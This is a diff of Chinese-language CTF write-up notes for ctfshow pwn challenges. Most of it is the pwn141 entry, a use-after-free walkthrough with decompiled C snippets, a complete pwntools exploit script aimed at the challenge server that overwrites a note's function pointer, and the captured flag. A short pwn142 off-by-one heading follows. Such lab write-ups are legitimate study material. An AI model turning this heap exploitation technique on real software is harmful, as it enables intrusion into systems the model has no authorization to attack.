@@ -788,7 +788,7 @@ ctfshow{2c9a549f-f272-4b67-9a37-65c0931a46de}
 
 
 
-## 141. pwn141
+## ==141. pwn141（UAF）==
 
 使用已释放的内存
 
@@ -798,31 +798,123 @@ ctfshow{2c9a549f-f272-4b67-9a37-65c0931a46de}
 
 先检查，32位，Partial RELRO、no pie ，其他全开
 
-
-
 看到menu，发现有add、delete、print三种操作
 
-
-
 v3要小于4才能到下面的，就是要在三种操作中选择
-
-
 
 题目以及提示了使用已经释放的内存
 
 
 
-先看del_note，可以看到有两次free的操作
+看到add函数，第一次malloc结构体，第二次malloc大小
+
+可以看到notelist的结构体为：
+
+```c
+*((_DWORD *)&notelist + i) = malloc(8u);
+**((_DWORD **)&notelist + i) = print_note_content;
+```
+
+8u下一个地址就是存放`print_note_content`
+
+
+
+先看del_note，可以看到有两次free的操作，并且没有将指针置空
+
+```c
+if ( *((_DWORD *)&notelist + v1) )
+  {
+    free(*(void **)(*((_DWORD *)&notelist + v1) + 4));
+    free(*((void **)&notelist + v1));
+    puts("Success");
+  }
+```
+
+
+
+而且打印函数那边没有对函数指针做出验证
+
+```c
+if ( *((_DWORD *)&notelist + v1) )
+    (**((void (__cdecl ***)(_DWORD))&notelist + v1))(*((_DWORD *)&notelist + v1));
+```
+
+
+
+再找到use函数入口
+
+```
+use_addr = 0x08049684
+```
+
+
+
+标准的UAF
+
+
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+from struct import pack
+import pwnlib
+context(arch='i386',os='linux',log_level='debug')
+
+ip = "pwn.challenge.ctf.show"
+port = 28212
+elf = ELF('./pwn')
+
+r = remote(ip,port)
+
+def create(size,content):
+    r.recvuntil("choice :")
+    r.sendline("1")
+    r.recvuntil("Note size :")
+    r.sendline(str(size))
+    r.recvuntil("Content :")
+    r.sendline(content)
+
+def delete(index):
+    r.recvuntil("choice :")
+    r.sendline("2")
+    r.recvuntil("Index :")
+    r.sendline(str(index))
+
+def show(index):
+    r.recvuntil(b"choice :")
+    r.sendline(b"3")
+    r.recvuntil("Index :")
+    r.sendline(str(index))
+
+create(32,"a"*32)
+create(32,"b"*32)
+delete(0)
+delete(1)
+create(0x8,p32(0x08049684))
+show(0)
+r.interactive()
+```
+
+
+
+拿到flag：
+
+```
+ctfshow{d351a228-c4f1-4889-bd10-52abb1bd13be}
+```
 
 
 
 
 
+## ==142. pwn142（off-by-one）==
 
+堆块重叠
 
+check一下amd64、partial relro，pie没开，其他都开了
 
-
-## 142. pwn142
+二话不说运行一波，发现还是经典的选择页面，直接进入ida
 
 
 
